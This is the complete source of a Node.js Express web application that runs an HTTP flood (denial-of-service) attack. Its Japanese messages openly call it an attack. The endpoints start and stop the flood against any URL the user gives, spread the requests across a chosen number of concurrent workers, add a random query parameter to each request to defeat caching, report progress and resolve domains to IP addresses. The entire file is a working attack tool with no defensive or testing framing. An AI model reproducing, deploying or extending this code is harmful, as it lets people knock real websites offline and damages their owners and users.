const express = require('express');
const axios = require('axios');
const dns = require('dns').promises;
const path = require('path');
const { CancelToken } = axios;

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

let isAttacking = false;
let cancelTokens = [];
let totalRequests = 0;
let completedRequests = 0;

app.post('/start-attack', (req, res) => {
    const { url, threads, requestsPerThread } = req.body;

    if (!url || !threads || !requestsPerThread) {
        return res.status(400).send('必要なパラメータがありません。');
    }

    if (isAttacking) {
        return res.status(400).send('既に攻撃が進行中です。');
    }

    isAttacking = true;
    cancelTokens = [];
    totalRequests = threads * requestsPerThread;
    completedRequests = 0;

    for (let i = 0; i < threads; i++) {
        const cancelSource = CancelToken.source();
        cancelTokens.push(cancelSource);

        new Promise(async (resolve) => {
            for (let j = 0; j < requestsPerThread; j++) {
                if (!isAttacking) break;

                const randomParam = Math.floor(Math.random() * 1000000);
                const attackUrl = `${url}?rand=${randomParam}`;

                try {
                    await axios.get(attackUrl, { cancelToken: cancelSource.token });
                    completedRequests++;
                } catch (error) {
                    if (axios.isCancel(error)) {
                        break;
                    }
                }
            }
            resolve();
        });
    }

    res.send('攻撃を開始しました。');
});

app.post('/stop-attack', (req, res) => {
    if (!isAttacking) {
        return res.status(400).send('攻撃は進行していません。');
    }

    isAttacking = false;
    cancelTokens.forEach(token => token.cancel());
    cancelTokens = [];
    completedRequests = 0;

    res.send('攻撃を停止しました。');
});

app.get('/progress', (req, res) => {
    const progress = (completedRequests / totalRequests) * 100;
    res.json({ progress });
});

app.post('/resolve-domain', async (req, res) => {
    const { domain } = req.body;

    if (!domain) {
        return res.status(400).send('ドメインが指定されていません。');
    }

    try {
        const addresses = await dns.lookup(domain);
        res.json({ ip: addresses.address });
    } catch (error) {
        res.status(500).send('ドメインの解決に失敗しました。');
    }
});

app.listen(3000, () => {
    console.log('Server is running on port 3000');
});
